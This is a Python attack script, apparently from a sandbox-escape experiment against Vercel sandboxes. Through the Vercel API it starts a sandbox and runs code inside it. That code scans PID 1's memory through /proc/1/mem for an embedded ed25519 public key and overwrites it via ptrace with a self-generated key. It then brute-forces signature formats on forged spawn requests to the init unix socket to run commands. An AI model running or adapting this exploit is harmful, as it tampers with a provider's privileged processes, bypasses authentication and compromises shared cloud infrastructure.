# 实验J53: 全内存公钥定位 + ptrace 写入替换 + 签名格式爆破
# 目标: 在所有段找 pubkey (原始32字节 + base64), ptrace 替换后试签名格式
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj53"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, base64, subprocess, json, time, ctypes

PUB_B64 = "zBO7hUsIkDOrMW4VmKei/v0KlhZflnTw7RAYFeoT5uw="
PUB = base64.b64decode(PUB_B64)

# 生成自己的密钥
os.makedirs("/tmp/k", exist_ok=True)
os.chdir("/tmp/k")
subprocess.run(["openssl", "genpkey", "-algorithm", "ed25519", "-out", "key.pem"], capture_output=True)
subprocess.run(["openssl", "pkey", "-in", "key.pem", "-pubout", "-out", "pub.pem"], capture_output=True)
MYPUB = subprocess.run(["openssl", "pkey", "-pubin", "-in", "pub.pem", "-outform", "DER"],
                       capture_output=True).stdout
i = MYPUB.rfind(b"\x03\x21\x00")
MYPUB32 = MYPUB[i+3:i+35]
print("my pub:", base64.b64encode(MYPUB32).decode(), flush=True)

print("===== [1] 二进制文件内搜索 =====", flush=True)
b = open("/run/vercel/share/sandbox-init", "rb").read()
for name, pat in [("pub32", PUB), ("pub-b64", PUB_B64.encode())]:
    idxs = []
    i = 0
    while True:
        j = b.find(pat, i)
        if j < 0:
            break
        idxs.append(j)
        i = j + 1
    print("%s in binary: %s" % (name, [hex(x) for x in idxs[:10]]), flush=True)

print("===== [2] 全内存搜索 (所有可读段, 分块) =====", flush=True)
def mem_search(patterns, max_seg=256*1024*1024, chunk=16*1024*1024):
    fd = os.open("/proc/1/mem", os.O_RDONLY)
    maps = open("/proc/1/maps").read()
    results = {k: [] for k in patterns}
    for line in maps.splitlines():
        p = line.split()
        if len(p) < 2 or "r" not in p[1]:
            continue
        addr = p[0].split("-")
        start, end = int(addr[0], 16), int(addr[1], 16)
        if end - start > max_seg:
            continue
        pa = p[5] if len(p) > 5 else ""
        # 跳过 vsyscall/vvar/vdso
        if pa in ("[vsyscall]", "[vvar]", "[vvar_vclock]", "[vdso]"):
            continue
        cur = start
        while cur < end:
            n = min(chunk, end - cur)
            try:
                os.lseek(fd, cur, os.SEEK_SET)
                data = os.read(fd, n)
            except Exception:
                break
            for k, pat in patterns.items():
                idx = 0
                while True:
                    j = data.find(pat, idx)
                    if j < 0:
                        break
                    results[k].append((cur + j, pa, hex(cur + j)))
                    idx = j + 1
                    if len(results[k]) > 12:
                        break
                if len(results[k]) > 12:
                    pass
            cur += n
            if any(len(v) > 12 for v in results.values()):
                pass
    os.close(fd)
    return results

res = mem_search({"pub32": PUB, "pub-b64": PUB_B64.encode()})
for k, v in res.items():
    print("%s hits: %d" % (k, len(v)), flush=True)
    for addr, pa, hx in v[:12]:
        print("   %s %s perm=%s" % (hx, pa, ""), flush=True)
    # 打印段权限
    if v:
        addr0 = v[0][0]
        maps = open("/proc/1/maps").read()
        for line in maps.splitlines():
            pp = line.split()
            if len(pp) < 2:
                continue
            a = pp[0].split("-")
            if int(a[0], 16) <= addr0 < int(a[1], 16):
                print("   seg line: %s" % line, flush=True)

print("===== [3] ptrace 写测试 (写回原值) =====", flush=True)
targets = []
for k in ("pub32", "pub-b64"):
    if res[k]:
        targets.append((res[k][0][0], k))
print("targets:", [(hex(a), k) for a, k in targets], flush=True)

def ptrace_write(addr, data):
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.ptrace(16, 1, None, None)  # ATTACH
    libc.waitpid(1, None, 0)
    PTRACE_POKEDATA = 5
    ok = 0
    for off in range(0, len(data), 8):
        word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
        r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
        if r == 0:
            ok += 1
    libc.ptrace(17, 1, None, None)  # DETACH
    return ok, (len(data) + 7) // 8

for addr, k in targets:
    pat = PUB if k == "pub32" else PUB_B64.encode()
    ok, total = ptrace_write(addr, pat)
    print("ptrace write %s @ %s: %d/%d" % (k, hex(addr), ok, total), flush=True)

print("===== [4] 真实替换 + 签名格式爆破 =====", flush=True)
def ccall(path, body, hdrs, timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", json.dumps(body), "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

def sign(msg: bytes):
    with open("/tmp/k/msg.bin", "wb") as f:
        f.write(msg)
    r = subprocess.run(["openssl", "pkeyutl", "-sign", "-inkey", "/tmp/k/key.pem",
                        "-rawin", "-in", "/tmp/k/msg.bin", "-out", "/tmp/k/sig.bin"],
                       capture_output=True)
    if r.returncode != 0:
        return None
    return open("/tmp/k/sig.bin", "rb").read()

# 替换 pub32 为我们自己的 (只替换第一个命中)
if res["pub32"]:
    addr0 = res["pub32"][0][0]
    ok, total = ptrace_write(addr0, MYPUB32)
    print("REPLACED pub32 @ %s: %d/%d" % (hex(addr0), ok, total), flush=True)

body = {"command": "id"}
body_j = json.dumps(body)
formats = {
    "ts":        lambda ts: ts.encode(),
    "ts+body":   lambda ts: (ts + body_j).encode(),
    "body+ts":   lambda ts: (body_j + ts).encode(),
    "ts\\nbody": lambda ts: (ts + "\n" + body_j).encode(),
    "sha256(ts+body)": lambda ts: hashlib.sha256((ts + body_j).encode()).digest(),
    "sha256(body+ts)": lambda ts: hashlib.sha256((body_j + ts).encode()).digest(),
}
import hashlib
for name, fn in formats.items():
    ts = str(int(time.time() * 1000))
    sig = sign(fn(ts))
    if sig is None:
        print("%-18s sign err" % name, flush=True)
        continue
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body,
                {"x-timestamp": ts, "x-signature": base64.b64encode(sig).decode()})
    m = re.search(r'\{"error".*?\}', out)
    status = m.group(0) if m else ("OK?" + out[-300:])
    print("%-18s -> %s" % (name, status), flush=True)
    if m and "unauthenticated" not in m.group(0):
        print("!!! DIFFERENT ERROR: %s" % out[:800], flush=True)
'''
run_cmd(sid, SCAN, "mem-pubkey-locate-ptrace", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
